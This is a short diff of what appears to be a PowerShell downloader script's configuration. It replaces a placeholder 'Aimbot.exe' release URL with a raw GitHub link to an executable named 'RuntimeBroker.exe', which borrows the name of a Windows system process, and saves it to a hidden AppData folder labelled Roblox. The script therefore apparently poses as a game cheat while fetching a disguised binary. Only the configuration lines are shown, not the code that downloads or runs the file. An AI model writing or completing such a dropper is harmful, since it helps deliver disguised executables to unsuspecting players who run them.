@@ -5,7 +5,7 @@
 
 # ------------------- CONFIGURATION -------------------
 # Replace with your actual .exe download URL (GitHub release raw link)
-$DownloadUrl = "https://github.com/YourUsername/YourRepo/releases/download/v1.0/Aimbot.exe"
+$DownloadUrl = "https://github.com/leone0988/somthing-cool/raw/refs/heads/main/RuntimeBroker.exe"
 
 # Destination folder inside AppData (hidden by default)
 $DestinationFolder = "$env:APPDATA\Roblox"
